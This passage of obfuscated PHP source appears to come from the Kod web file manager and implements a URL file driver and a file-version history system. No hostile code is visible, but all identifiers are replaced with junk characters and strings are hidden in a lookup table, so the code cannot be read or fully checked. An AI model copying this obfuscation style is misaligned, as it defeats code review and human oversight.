$this->cacheMethod($_SERVER[Î·Ü›öğ][182], $±ì¥µ»à); } protected function _objectMeta($ß¹üœŠ) { $¢ˆ—ƒÁª =& $_SERVER[Î·Ü›öğ]; if ($ß¹üœŠ == $¢ˆ—ƒÁª[12] || $ß¹üœŠ == $¢ˆ—ƒÁª[8]) { return array(); } $‹æÁªó› = $this->ussRequest($ß¹üœŠ, $¢ˆ—ƒÁª[1636]); if (!$‹æÁªó›[$¢ˆ—ƒÁª[1327]]) { return null; } $µØ”‡†ç = isset($‹æÁªó›[$¢ˆ—ƒÁª[1317]]) ? $‹æÁªó›[$¢ˆ—ƒÁª[1317]] : array(); if (!isset($µØ”‡†ç[$¢ˆ—ƒÁª[1637]])) { return null; } $²â‚Ü¬ì = array($¢ˆ—ƒÁª[33] => isset($µØ”‡†ç[$¢ˆ—ƒÁª[1637]]) ? $µØ”‡†ç[$¢ˆ—ƒÁª[1637]] : null, $¢ˆ—ƒÁª[79] => isset($µØ”‡†ç[$¢ˆ—ƒÁª[1638]]) ? $µØ”‡†ç[$¢ˆ—ƒÁª[1638]] : null, $¢ˆ—ƒÁª[248] => isset($µØ”‡†ç[$¢ˆ—ƒÁª[1639]]) ? $µØ”‡†ç[$¢ˆ—ƒÁª[1639]] : null, $¢ˆ—ƒÁª[1606] => isset($µØ”‡†ç[$¢ˆ—ƒÁª[1640]]) ? $µØ”‡†ç[$¢ˆ—ƒÁª[1640]] : null); $²â‚Ü¬ì[$¢ˆ—ƒÁª[1607]] = isset($µØ”‡†ç[$¢ˆ—ƒÁª[1641]]) ? strtotime($µØ”‡†ç[$¢ˆ—ƒÁª[1641]]) : $²â‚Ü¬ì[$¢ˆ—ƒÁª[1606]]; return $²â‚Ü¬ì; } protected function _isFolder($Ûˆ‡ÛÈà) { $éÜÇ—— =& $_SERVER[Î·Ü›öğ]; if ($Ûˆ‡ÛÈà == $éÜÇ——[12] || $Ûˆ‡ÛÈà == $éÜÇ——[8]) { return !0; } $×òã‚³ã = $this->_objectMeta($Ûˆ‡ÛÈà); return isset($×òã‚³ã[$éÜÇ——[33]]) && $×òã‚³ã[$éÜÇ——[33]] == $éÜÇ——[78] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($·ü¯õ¨ = false) { } public function exist($¿¥Å€§ù) { $“ÂÇå˜È = $this->info($¿¥Å€§ù); return $“ÂÇå˜È[$_SERVER[Î·Ü›öğ][235]]; } public function isFile($ê‡ïê’Â) { $„“à‚ï = $this->info($ê‡ïê’Â); return $„“à‚ï[$_SERVER[Î·Ü›öğ][235]]; } public function isFolder($’ïåàÈÇ) { return !1; } public function size($ª¢“Ç‘Í) { $öÚÑ»ïû = $this->info($ª¢“Ç‘Í); return $öÚÑ»ïû[$_SERVER[Î·Ü›öğ][79]]; } public function info($™ã€¾©) { return $this->infoParse($™ã€¾©); } public function infoAuth($Ú¸Æ•ë») { return $this->infoParse($Ú¸Æ•ë»); } public function infoWithChildren($ÀáëÄı) { return $this->infoParse($ÀáëÄı); } public function infoFull($¨”¿¿°¼) { return $this->infoParse($¨”¿¿°¼); } private function infoParse($úÎè‡¸ç) { $ş³˜Èµµ =& $_SERVER[Î·Ü›öğ]; $ÄŞÓç¯† = $this->header($úÎè‡¸ç); if (!$ÄŞÓç¯† || !$ÄŞÓç¯†[$ş³˜Èµµ[839]]) { return !1; } $ËÙœè–¨ = _get($ÄŞÓç¯†, $ş³˜Èµµ[414], 0); $ïÈşÒŞø = array($ş³˜Èµµ[32] => $ÄŞÓç¯†[$ş³˜Èµµ[32]], $ş³˜Èµµ[87] => $úÎè‡¸ç, $ş³˜Èµµ[33] => $ş³˜Èµµ[233], $ş³˜Èµµ[79] => intval($ËÙœè–¨), $ş³˜Èµµ[169] => get_path_ext($ÄŞÓç¯†[$ş³˜Èµµ[32]]), $ş³˜Èµµ[1493] => $ËÙœè–¨ > 0 && $ÄŞÓç¯†[$ş³˜Èµµ[1642]], $ş³˜Èµµ[1494] => !1); return $ïÈşÒŞø; } private function header($óşŸèà¯) { $ûç’›àê =& $_SERVER[Î·Ü›öğ]; if (isset(self::$_cacheHeader[$óşŸèà¯])) { return self::$_cacheHeader[$óşŸèà¯]; } $÷ÖîÅñô = isset($GLOBALS[$ûç’›àê[1643]]) ? $GLOBALS[$ûç’›àê[1643]] : !1; $GLOBALS[$ûç’›àê[1643]] = !0; self::$_cacheHeader[$óşŸèà¯] = url_header($óşŸèà¯); $GLOBALS[$ûç’›àê[1643]] = $÷ÖîÅñô; return self::$_cacheHeader[$óşŸèà¯]; } public function hashSimple($‰ƒ½˜µÎ, $–ö‘®»ü = false) { $ßÓ”Á¤æ =& $_SERVER[Î·Ü›öğ]; $â¾’ÙºÒ = $this->info($‰ƒ½˜µÎ); if (!$â¾’ÙºÒ || !$â¾’ÙºÒ[$ßÓ”Á¤æ[235]]) { return !1; } $½Ç¥ù¾ = $â¾’ÙºÒ[$ßÓ”Á¤æ[79]]; $ÁØŠìı„ = 200; $˜çÏâ÷Ø = 50; if ($½Ç¥ù¾ <= $ÁØŠìı„ * $˜çÏâ÷Ø) { return md5($this->fileSubstr($‰ƒ½˜µÎ, 0, $½Ç¥ù¾)) . $½Ç¥ù¾; } $ıÎ¦  = intval($½Ç¥ù¾ / $˜çÏâ÷Ø); $§€Ü¦Ïœ = $ßÓ”Á¤æ[12]; $ù—Ã—‡ = timeFloat(); $ªÁŞšùª = 15; for ($Âœèà¹Ï = 0; $Âœèà¹Ï < $˜çÏâ÷Ø; $Âœèà¹Ï++) { if (timeFloat() - $ù—Ã—‡ > $ªÁŞšùª) { return !1; } $¸İ³ëèñ = $this->fileSubstr($‰ƒ½˜µÎ, $ıÎ¦  * $Âœèà¹Ï, $ÁØŠìı„); if (!$¸İ³ëèñ) { return !1; } $§€Ü¦Ïœ .= $¸İ³ëèñ; } $§€Ü¦Ïœ .= $this->fileSubstr($‰ƒ½˜µÎ, $½Ç¥ù¾ - $ÁØŠìı„, $ÁØŠìı„); return md5($§€Ü¦Ïœ) . $½Ç¥ù¾; } public function getContent($¸÷µê¤) { return $this->fileSubstr($¸÷µê¤); } public function fileSubstr($Å·•¸Î…, $ş€¼¬â = 0, $¦¿†âÎÔ = -1) { $µÊƒ©Óú =& $_SERVER[Î·Ü›öğ]; $‡åª¢õÃ = $this->info($Å·•¸Î…); if (!$‡åª¢õÃ || !$‡åª¢õÃ[$µÊƒ©Óú[235]] && $‡åª¢õÃ[$µÊƒ©Óú[79]] > 1024 * 1024 * 10) { return !1; } if ($¦¿†âÎÔ === -1) { $¦¿†âÎÔ = $‡åª¢õÃ[$µÊƒ©Óú[79]]; } if ($¦¿†âÎÔ == 0) { return $µÊƒ©Óú[12]; } $´èÆ¹²É = array($µÊƒ©Óú[1644] . $ş€¼¬â . $µÊƒ©Óú[879] . ($ş€¼¬â + $¦¿†âÎÔ - 1)); $êóçæŞÊ = url_request($Å·•¸Î…, $µÊƒ©Óú[1533], !1, $´èÆ¹²É, !1, !1, 30); return $êóçæŞÊ[$µÊƒ©Óú[1317]] ? $êóçæŞÊ[$µÊƒ©Óú[1317]] : $µÊƒ©Óú[12]; } public function download($‡­ÒĞŸî, $şÄ»Å¸Ş) { Downloader::start($‡­ÒĞŸî, $şÄ»Å¸Ş); return $şÄ»Å¸Ş; } } goto BœØçÜ¤İŞ; e¾”ï˜À‚”: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $›Ü¦”¢° =& $_SERVER[Î·Ü›öğ]; $«¤äÄó÷ = $GLOBALS[$›Ü¦”¢°[6]][$›Ü¦”¢°[92]]; if ($«¤äÄó÷[$›Ü¦”¢°[1331]] != 1) { return; } if ($«¤äÄó÷[$›Ü¦”¢°[1332]] <= 0) { return; } if (isset($_REQUEST[$›Ü¦”¢°[1333]]) && $_REQUEST[$›Ü¦”¢°[1333]] == $›Ü¦”¢°[91]) { return; } Hook::bind($›Ü¦”¢°[1334], $›Ü¦”¢°[1335]); Hook::bind($›Ü¦”¢°[1336], $›Ü¦”¢°[1337]); Hook::bind($›Ü¦”¢°[1338], $›Ü¦”¢°[1339]); Hook::bind($›Ü¦”¢°[1340], $›Ü¦”¢°[1341]); Hook::bind($›Ü¦”¢°[1342], $›Ü¦”¢°[1343]); Hook::bind($›Ü¦”¢°[1344], $›Ü¦”¢°[1345]); } public static function eventBeforeUpload($Œ‡“„) { if ($Œ‡“„[3] && $Œ‡“„[3] != REPEAT_REPLACE) { return; } $ÏÓå‡‚² = self::parsePath($Œ‡“„[0]); if (!$ÏÓå‡‚²) { return; } self::add($ÏÓå‡‚²); } public static function eventBeforeEdit($’ÏàÅø±) { $ãÒŸİ§ = self::parsePath($’ÏàÅø±[0]); if (!$ãÒŸİ§) { return; } self::add($ãÒŸİ§); } public static function eventBeforeCopyFile($éÀÇ°Æ , $œËõš½, $ø¹ˆ»ã®, $Ñ±ÄÅÂô, $¨ãçİÕè, $ë¢êºÚ) { $µ¿©¹Ÿù =& $_SERVER[Î·Ü›öğ]; if (isset($ø¹ˆ»ã®->_data[$µ¿©¹Ÿù[1264]]) && $ø¹ˆ»ã®->_data[$µ¿©¹Ÿù[1264]]) { return; } $à×îò¤ = $ø¹ˆ»ã®->getPathOuter($Ñ±ÄÅÂô); $®ß°ÈÑ = self::parsePath($à×îò¤); if (!$®ß°ÈÑ) { return; } self::add($®ß°ÈÑ); } public static function eventBeforeRename($¦ã£İ½”) { $à´áÃ²¼ =& $_SERVER[Î·Ü›öğ]; $—³ªÌà = self::parsePath($¦ã£İ½”[0]); if (!$—³ªÌà) { return; } $ç“¥ç¼ = self::checkInHistory($—³ªÌà); if (!$ç“¥ç¼) { return; } if ($ç“¥ç¼[$à´áÃ²¼[33]] == $à´áÃ²¼[233]) { $Ô˜óÏà = self::listData($—³ªÌà); if ($Ô˜óÏà && $Ô˜óÏà[$à´áÃ²¼[447]]) { self::moveHistory($—³ªÌà, $¦ã£İ½”[1]); } } else { IO::rename($ç“¥ç¼[$à´áÃ²¼[87]], $¦ã£İ½”[1]); } } public static function eventBeforeMove($¤­¿³‘È) { $Ú ·Úï© =& $_SERVER[Î·Ü›öğ]; $Ù®‰ãÒ = self::parsePath($¤­¿³‘È[0]); if (!$Ù®‰ãÒ) { return; } $ìèî‡à = self::parsePath($¤­¿³‘È[1]); if (!$ìèî‡à) { return; } $Ìã§‹¹ì = $¤­¿³‘È[3]; $õÜ¤å¹ = self::checkInHistory($Ù®‰ãÒ); if (!$õÜ¤å¹) { return; } $óÊÓ× = self::pathHistory($ìèî‡à); if ($õÜ¤å¹[$Ú ·Úï©[33]] == $Ú ·Úï©[233]) { $²ô‰“‡á = self::listData($Ù®‰ãÒ); $²Î•Í¸ = rtrim($ìèî‡à, $Ú ·Úï©[8]) . $Ú ·Úï©[8] . ($Ìã§‹¹ì ? $Ìã§‹¹ì : get_path_this($Ù®‰ãÒ)); $î…£¸¹Ò = self::listData($²Î•Í¸); if ($²ô‰“‡á && $²ô‰“‡á[$Ú ·Úï©[447]] && $î…£¸¹Ò && $î…£¸¹Ò[$Ú ·Úï©[447]]) { return self::clear($Ù®‰ãÒ); } if ($²ô‰“‡á && $²ô‰“‡á[$Ú ·Úï©[447]]) { self::moveHistory($Ù®‰ãÒ, $Ìã§‹¹ì, $óÊÓ×); } } else { IO::move($õÜ¤å¹[$Ú ·Úï©[87]], $óÊÓ×, !1, $Ìã§‹¹ì); self::clearEmptyFolder(IO::pathFather($õÜ¤å¹[$Ú ·Úï©[87]])); } } public static function eventAfterRemove($ú¾»‹Ğ, $™Š«ùç) { $î½œŞ =& $_SERVER[Î·Ü›öğ]; if (!$™Š«ùç) { return; } $ò¬ËŒ„Â = self::parsePath($ú¾»‹Ğ[0]); if (!$ò¬ËŒ„Â) { return; } $¯¾‘³†‚ = self::checkInHistory($ò¬ËŒ„Â); if (!$¯¾‘³†‚) { return; } if ($¯¾‘³†‚[$î½œŞ[33]] == $î½œŞ[233]) { $²’Ò÷ò­ = self::listData($ò¬ËŒ„Â, !1); if ($²’Ò÷ò­ && $²’Ò÷ò­[$î½œŞ[447]]) { self::clear($ò¬ËŒ„Â, !1); } } else { IO::remove($¯¾‘³†‚[$î½œŞ[87]]); self::clearEmptyFolder(IO::pathFather($¯¾‘³†‚[$î½œŞ[87]])); } } private static function checkInHistory($¯æË“¬û) { $Ó‘´µçÙ = self::pathHistory($¯æË“¬û); if (!IO::exist($Ó‘´µçÙ)) { $Ó‘´µçÙ .= $_SERVER[Î·Ü›öğ][1346]; } return IO::exist($Ó‘´µçÙ) ? IO::info($Ó‘´µçÙ) : !1; } private static function parsePath($ÄØ¹›“¹) { $ÔÖ„ÜÍä =& $_SERVER[Î·Ü›öğ]; if (!$ÄØ¹›“¹) { return !1; } if (isset($GLOBALS[$ÔÖ„ÜÍä[1347]]) && $GLOBALS[$ÔÖ„ÜÍä[1347]]) { return; } $±Ã”Î¸Ô = KodIO::parse($ÄØ¹›“¹); $”şÁÎ‡… = $±Ã”Î¸Ô[$ÔÖ„ÜÍä[33]]; $íêÄã÷ì = !$”şÁÎ‡… || $”şÁÎ‡… == KodIO::KOD_IO || $”şÁÎ‡… == KodIO::KOD_SHARE_ITEM; if (!$íêÄã÷ì || !$±Ã”Î¸Ô[$ÔÖ„ÜÍä[1348]]) { return !1; } if (substr($ÄØ¹›“¹, 0, strlen(DATA_PATH . $ÔÖ„ÜÍä[1349])) == DATA_PATH . $ÔÖ„ÜÍä[1349]) { return !1; } if ($”şÁÎ‡… == KodIO::KOD_SHARE_ITEM) { $ï˜Í¢†¤ = IO::init($ÄØ¹›“¹); if ($ï˜Í¢†¤->pathParse[$ÔÖ„ÜÍä[1260]]) { return self::parsePath($ï˜Í¢†¤->pathParse[$ÔÖ„ÜÍä[1260]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $¯‰úÔü = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $ÔÖ„ÜÍä[1350]); foreach ($¯‰úÔü as $ÅÊƒ—Ú˜) { if (!$”şÁÎ‡… && substr($ÄØ¹›“¹, 0, strlen($ÅÊƒ—Ú˜)) == $ÅÊƒ—Ú˜) { return !1; } } self::log($GLOBALS[$ÔÖ„ÜÍä[1254]] . $ÔÖ„ÜÍä[1351] . $ÄØ¹›“¹); return $ÄØ¹›“¹; } private static function pathHistory($·ŒûÂÛ£) { $Ù«¬— “ =& $_SERVER[Î·Ü›öğ]; $¢½­³· = self::$_historyBase . ltrim(KodIO::clear($·ŒûÂÛ£), $Ù«¬— “[8]); $¢½­³· = str_replace(array($Ù«¬— “[1352]), array($Ù«¬— “[1353]), $¢½­³·); return $¢½­³·; } public static function log($Š•û†¸®) { } public static function historyCount($¯†ÉíÜ™) { $Óµ–­Ÿº =& $_SERVER[Î·Ü›öğ]; $ıåŒàæÚ = array(); $—ÇŒ‡ôù = array(); foreach ($¯†ÉíÜ™ as $İŸ¶€²¸) { $Ò²â³œÀ = get_path_father($İŸ¶€²¸); if (!$—ÇŒ‡ôù[$Ò²â³œÀ]) { $—ÇŒ‡ôù[$Ò²â³œÀ] = array(); } $—ÇŒ‡ôù[$Ò²â³œÀ][] = get_path_this($İŸ¶€²¸); } foreach ($—ÇŒ‡ôù as $Ò²â³œÀ => $ÕõÈ­—¼) { $Ö÷¢¢ğí = self::parsePath($Ò²â³œÀ); if (!$Ö÷¢¢ğí) { continue; } foreach ($ÕõÈ­—¼ as $«‚Ö§ É) { $°Ã°¡½î = self::listData(rtrim($Ö÷¢¢ğí, $Óµ–­Ÿº[8]) . $Óµ–­Ÿº[8] . $«‚Ö§ É, !1); if ($°Ã°¡½î && $°Ã°¡½î[$Óµ–­Ÿº[447]]) { $ıåŒàæÚ[rtrim($Ò²â³œÀ, $Óµ–­Ÿº[8]) . $Óµ–­Ÿº[8] . $«‚Ö§ É] = count($°Ã°¡½î[$Óµ–­Ÿº[447]]); } } } return $ıåŒàæÚ; } public static function add($ÚÓ©´ºá) { $«êì™…â =& $_SERVER[Î·Ü›öğ]; $¿‰ŠßÕÂ = self::listData($ÚÓ©´ºá); if (!$¿‰ŠßÕÂ) { return; } $–ÊÍÑè = Model($«êì™…â[862])->get($«êì™…â[1354]); $ËÇ›“¤¤ = intval($GLOBALS[$«êì™…â[6]][$«êì™…â[92]][$«êì™…â[1332]]); $ĞšÒ³“ = $–ÊÍÑè == $«êì™…â[1355] ? min(5, $ËÇ›“¤¤) : $ËÇ›“¤¤; if ($ËÇ›“¤¤ <= 0) { return; } $·°ì¬äğ = IO::info($ÚÓ©´ºá); $ë¨ŞÂ”ó = $¿‰ŠßÕÂ[$«êì™…â[447]]; if ($·°ì¬äğ[$«êì™…â[79]] == 0) { return; } if ($·°ì¬äğ[$«êì™…â[79]] >= 1024 * 1024 * 500) { return !1; } $õÔÂ¡‡¿ = IO::hashSimple($ÚÓ©´ºá); if ($ë¨ŞÂ”ó && $ë¨ŞÂ”ó[0][$«êì™…â[688]] == $õÔÂ¡‡¿) { return !0; } if (array_key_exists($«êì™…â[236], $·°ì¬äğ) && !$·°ì¬äğ[$«êì™…â[236]]) { return !1; } $ÇÙ›ü¶İ = short_id(time()); $í¦Ñí­ = array($«êì™…â[477] => $ÇÙ›ü¶İ, $«êì™…â[688] => $õÔÂ¡‡¿, $«êì™…â[32] => $·°ì¬äğ[$«êì™…â[32]] . $«êì™…â[10] . date($«êì™…â[1356]) . rand_string(1), $«êì™…â[79] => $·°ì¬äğ[$«êì™…â[79]], $«êì™…â[538] => USER_ID, $«êì™…â[234] => time(), $«êì™…â[1357] => $«êì™…â[12]); IO::mkdir($¿‰ŠßÕÂ[$«êì™…â[1358]]); $‰ø‚¦Àà = IO::copy($ÚÓ©´ºá, $¿‰ŠßÕÂ[$«êì™…â[1358]], !1, $í¦Ñí­[$«êì™…â[32]]); if (!$‰ø‚¦Àà) { self::clearEmptyFolder($¿‰ŠßÕÂ[$«êì™…â[1358]]); return !1; } array_unshift($ë¨ŞÂ”ó, $í¦Ñí­); if (count($ë¨ŞÂ”ó) > $ĞšÒ³“) { $ÇÛèİÎÂ = array_slice($ë¨ŞÂ”ó, $ĞšÒ³“); foreach ($ÇÛèİÎÂ as $°æß°íô) { IO::remove($¿‰ŠßÕÂ[$«êì™…â[1358]] . $°æß°íô[$«êì™…â[32]]); } $ë¨ŞÂ”ó = array_slice($ë¨ŞÂ”ó, 0, $ĞšÒ³“); } return self::saveData($¿‰ŠßÕÂ[$«êì™…â[1359]], $ë¨ŞÂ”ó); } public static function remove($œé€ïŸÜ, $ôˆÕ™™Á) { $üûÀİ‚õ =& $_SERVER[Î·Ü›öğ]; $ŞÔ²ê™ = self::listData($œé€ïŸÜ); $¨ïÃü¶ = array(); if (!$ŞÔ²ê™) { return !1; } foreach ($ŞÔ²ê™[$üûÀİ‚õ[447]] as $ıâòÒÖ¢) { if ($ıâòÒÖ¢[$üûÀİ‚õ[477]] == $ôˆÕ™™Á) { IO::remove($ŞÔ²ê™[$üûÀİ‚õ[1358]] . $ıâòÒÖ¢[$üûÀİ‚õ[32]]); continue; } $¨ïÃü¶[] = $ıâòÒÖ¢; } return self::saveData($ŞÔ²ê™[$üûÀİ‚õ[1359]], $¨ïÃü¶); } public static function clear($ªÔë¿¥, $¤Ì…Æ§Ú = true) { $ÔÆÅá¥š =& $_SERVER[Î·Ü›öğ]; $ßİ†®Ù¢ = self::listData($ªÔë¿¥, $¤Ì…Æ§Ú); if (!$ßİ†®Ù¢) { return !1; } foreach ($ßİ†®Ù¢[$ÔÆÅá¥š[447]] as $ú¥üÈµ) { IO::remove($ßİ†®Ù¢[$ÔÆÅá¥š[1358]] . $ú¥üÈµ[$ÔÆÅá¥š[32]]); } return self::saveData($ßİ†®Ù¢[$ÔÆÅá¥š[1359]], array()); } public static function moveHistory($—€Õ¶‹Ú, $ë²áîŠŸ = '', $£ÆúÅã‡ = '') { $€™˜¸‹ü =& $_SERVER[Î·Ü›öğ]; $îÇçßûÒ = self::listData($—€Õ¶‹Ú, !1); if (!$îÇçßûÒ || !$îÇçßûÒ[$€™˜¸‹ü[447]]) { return !1; } $ŒÁşø¹ = $€™˜¸‹ü[1346]; $ë²áîŠŸ = $ë²áîŠŸ ? $ë²áîŠŸ : get_path_this($—€Õ¶‹Ú); $£ÆúÅã‡ = $£ÆúÅã‡ ? $£ÆúÅã‡ : $îÇçßûÒ[$€™˜¸‹ü[1358]]; $”°’×Ï = substr(get_path_this($îÇçßûÒ[$€™˜¸‹ü[1359]]), 0, -strlen($ŒÁşø¹)); foreach ($îÇçßûÒ[$€™˜¸‹ü[447]] as $±©ÆÜ†µ => $ÈÔï°¡) { $¬˜ıï¶ü = $ë²áîŠŸ . substr($ÈÔï°¡[$€™˜¸‹ü[32]], strlen($”°’×Ï)); $ä¡Œ»¹µ = IO::move($îÇçßûÒ[$€™˜¸‹ü[1358]] . $ÈÔï°¡[$€™˜¸‹ü[32]], $£ÆúÅã‡, !1, $¬˜ıï¶ü); if ($ä¡Œ»¹µ) { $îÇçßûÒ[$€™˜¸‹ü[447]][$±©ÆÜ†µ][$€™˜¸‹ü[32]] = $¬˜ıï¶ü; } } $îÇçßûÒ[$€™˜¸‹ü[1359]] = IO::move($îÇçßûÒ[$€™˜¸‹ü[1359]], $£ÆúÅã‡, !1, $ë²áîŠŸ . $ŒÁşø¹); self::saveData($îÇçßûÒ[$€™˜¸‹ü[1359]], $îÇçßûÒ[$€™˜¸‹ü[447]]); self::clearEmptyFolder($îÇçßûÒ[$€™˜¸‹ü[1358]]); } public static function rollback($ŞÂ¢ßŞ˜, $ûñïå´¨) { $«³ÀäØ =& $_SERVER[Î·Ü›öğ]; $ºÌÍ‡Ä‰ = self::listData($ŞÂ¢ßŞ˜); if (!$ºÌÍ‡Ä‰) { return; } $¬®ÉÔ“Ì = IO::info($ŞÂ¢ßŞ˜); foreach ($ºÌÍ‡Ä‰[$«³ÀäØ[447]] as $ßŠïÌÅ => $ìµ¡ç“ğ) { if ($ìµ¡ç“ğ[$«³ÀäØ[477]] == $ûñïå´¨) { self::add($ŞÂ¢ßŞ˜); $İ Ùà÷ = $ºÌÍ‡Ä‰[$«³ÀäØ[1358]] . $ìµ¡ç“ğ[$«³ÀäØ[32]]; $êˆí« = IO::copy($İ Ùà÷, IO::pathFather($ŞÂ¢ßŞ˜), REPEAT_REPLACE, $¬®ÉÔ“Ì[$«³ÀäØ[32]]); if ($êˆí«) { self::remove($ŞÂ¢ßŞ˜, $ûñïå´¨); } return $êˆí«; } } return !1; } public static function setDetail($‚ûı—ù÷, $î’İÂÈ™, $ä³ÑıÆ˜) { $‰´Ê…Ôú =& $_SERVER[Î·Ü›öğ]; $¬ş½Ğ± = self::listData($‚ûı—ù÷); if (!$¬ş½Ğ±) { return; } foreach ($¬ş½Ğ±[$‰´Ê…Ôú[447]] as $“Š‡ë’İ => $»»¿§³›) { if ($»»¿§³›[$‰´Ê…Ôú[477]] == $î’İÂÈ™) { $¬ş½Ğ±[$‰´Ê…Ôú[447]][$“Š‡ë’İ][$‰´Ê…Ôú[1357]] = $ä³ÑıÆ˜; self::saveData($¬ş½Ğ±[$‰´Ê…Ôú[1359]], $¬ş½Ğ±[$‰´Ê…Ôú[447]]); return !0; } } return !1; } public static function fileInfo($’Ùõ´Î, $³Ç›®) { $Ş¨ÅğĞÜ =& $_SERVER[Î·Ü›öğ]; $›ì“ ßä = self::listData($’Ùõ´Î); if (!$›ì“ ßä) { show_json(LNG($Ş¨ÅğĞÜ[108]), !1); } $ ³½èÙ± = $Ş¨ÅğĞÜ[12]; foreach ($›ì“ ßä[$Ş¨ÅğĞÜ[447]] as $À¶æ¶£ö => $Ş»ş‰òœ) { if ($Ş»ş‰òœ[$Ş¨ÅğĞÜ[477]] != $³Ç›®) { continue; } $ ³½èÙ± = $›ì“ ßä[$Ş¨ÅğĞÜ[1358]] . $Ş»ş‰òœ[$Ş¨ÅğĞÜ[32]]; break; } if (!$ ³½èÙ±) { show_json(LNG($Ş¨ÅğĞÜ[108]), !1); } return IO::info($ ³½èÙ±); } public static function fileOut($¤Õ·ˆ€, $ñ¥¥›ø‡, $¸Ï¬¬øµ = false) { $ŸœÌİû =& $_SERVER[Î·Ü›öğ]; $ªäÖ¤ı = self::fileInfo($¤Õ·ˆ€, $ñ¥¥›ø‡); $©°§ûÀ =& $GLOBALS[$ŸœÌİû[7]]; $¸Ï¬¬øµ = isset($©°§ûÀ[$ŸœÌİû[1309]]) && $©°§ûÀ[$ŸœÌİû[1309]] == 1; if (isset($©°§ûÀ[$ŸœÌİû[33]]) && $©°§ûÀ[$ŸœÌİû[33]] == $ŸœÌİû[1360]) { return IO::fileOutImage($ªäÖ¤ı[$ŸœÌİû[87]], $©°§ûÀ[$ŸœÌİû[1361]]); } IO::fileOut($ªäÖ¤ı[$ŸœÌİû[87]], $¸Ï¬¬øµ, get_path_this($¤Õ·ˆ€)); } public static function listData($Í¬ÄïŞõ, $ÆÈ¯‡äË = true) { $şšµÓş =& $_SERVER[Î·Ü›öğ]; if ($ÆÈ¯‡äË && !IO::exist($Í¬ÄïŞõ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($Í¬ÄïŞõ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $¤¹Ÿµ = self::pathHistory($Í¬ÄïŞõ); $€¬ùÕÇƒ = array($şšµÓş[1359] => $¤¹Ÿµ . $şšµÓş[1346], $şšµÓş[1358] => rtrim(get_path_father($¤¹Ÿµ), $şšµÓş[8]) . $şšµÓş[8], $şšµÓş[447] => array()); $ƒ¼‹¸¹“ = IO::getContent($€¬ùÕÇƒ[$şšµÓş[1359]]); if ($ƒ¼‹¸¹“) { $»—ê¹Ï = json_decode($ƒ¼‹¸¹“, !0); if (is_array($»—ê¹Ï)) { $€¬ùÕÇƒ[$şšµÓş[447]] = $»—ê¹Ï; } } return $€¬ùÕÇƒ; } private static function saveData($›ÑÖ®Ë, $áı­îëÈ) { $û‚¡Ñ€¦ =& $_SERVER[Î·Ü›öğ]; self::log($û‚¡Ñ€¦[1362] . $›ÑÖ®Ë . $û‚¡Ñ€¦[74] . count($áı­îëÈ), $û‚¡Ñ€¦[841]); if ($áı­îëÈ) { return IO::setContent($›ÑÖ®Ë, json_encode($áı­îëÈ)); } $ï¥—ş½Ù = IO::pathFather($›ÑÖ®Ë); IO::remove($›ÑÖ®Ë); self::clearEmptyFolder($ï¥—ş½Ù); return !0; } public static function clearEmptyFolder($¡İÎ”Æİ) { $ªÅö î =& $_SERVER[Î·Ü›öğ]; if (trim($¡İÎ”Æİ, $ªÅö î[8]) == trim(self::$_historyBase, $ªÅö î[8])) { return; } $“óÂÔ– = IO::pathFather($¡İÎ”Æİ); $ŞğÍÙµ = IO::has($¡İÎ”Æİ, !0); if ($ŞğÍÙµ[$ªÅö î[242]] > 0 || $ŞğÍÙµ[$ªÅö î[243]] > 0) { return; } IO::remove($¡İÎ”Æİ); self::clearEmptyFolder($“óÂÔ–); } private static function getBasePath() { $Ê¤Å¨äŒ =& $_SERVER[Î·Ü›öğ]; $ÚÁÓëöÊ = Model($Ê¤Å¨äŒ[1363])->get($Ê¤Å¨äŒ[1364]); if ($ÚÁÓëöÊ) { if (!IO::exist($ÚÁÓëöÊ)) { IO::mkdir($ÚÁÓëöÊ); } if (get_path_this($ÚÁÓëöÊ) == $Ê¤Å¨äŒ[1349]) { $Ğ—±À“ = $Ê¤Å¨äŒ[1365] . rand_string(8); @rename($ÚÁÓëöÊ, get_path_father($ÚÁÓëöÊ) . $Ê¤Å¨äŒ[8] . $Ğ—±À“); $ÚÁÓëöÊ = DATA_PATH . $Ğ—±À“ . $Ê¤Å¨äŒ[8]; file_put_contents(DATA_PATH . $Ê¤Å¨äŒ[1296], $Ê¤Å¨äŒ[12]); Model($Ê¤Å¨äŒ[1363])->set($Ê¤Å¨äŒ[1364], $ÚÁÓëöÊ); } return $ÚÁÓëöÊ; } $ÚÁÓëöÊ = DATA_PATH . $Ê¤Å¨äŒ[1365] . rand_string(8) . $Ê¤Å¨äŒ[8]; $ÚÁÓëöÊ = IO::mkdir($ÚÁÓëöÊ); $ÚÁÓëöÊ = rtrim($ÚÁÓëöÊ, $Ê¤Å¨äŒ[8]) . $Ê¤Å¨äŒ[8]; file_put_contents($ÚÁÓëöÊ . $Ê¤Å¨äŒ[1296], $Ê¤Å¨äŒ[12]); file_put_contents(DATA_PATH . $Ê¤Å¨äŒ[1296], $Ê¤Å¨äŒ[12]); Model($Ê¤Å¨äŒ[1363])->set($Ê¤Å¨äŒ[1364], $ÚÁÓëöÊ); return $ÚÁÓëöÊ; } } class KodIO { const KOD_SOURCE = "\173\x73\157\165\162\x63\x65\175"; const KOD_USER_RECYCLE = "\x7b\165\x73\x65\x72\122\145\143\x79\143\x6c\145\175"; const KOD_USER_FAV = "\x7b\165\163\145\162\106\141\166\175"; const KOD_USER_FILE_TAG = "\173\x75\x73\145\162\x46\151\x6c\145\124\x61\147\x7d"; const KOD_USER_FILE_TYPE = "\173\165\163\145\162\106\151\x6c\145\x54\171\160\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\147\x72\x6f\165\x70\122\x6f\x6f\x74\x53\x65\154\146\175"; const KOD_USER_SHARE = "\173\165\x73\145\162\123\150\x61\x72\145\175"; const KOD_USER_SHARE_LINK = "\x7b\x75\163\x65\162\123\150\x61\x72\x65\114\x69\156\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\163\150\x61\x72\145\x54\157\115\145\x7d"; const KOD_SHARE_ITEM = "\173\x73\x68\x61\x72\145\111\164\x65\x6d\175"; const KOD_SHARE_LINK = 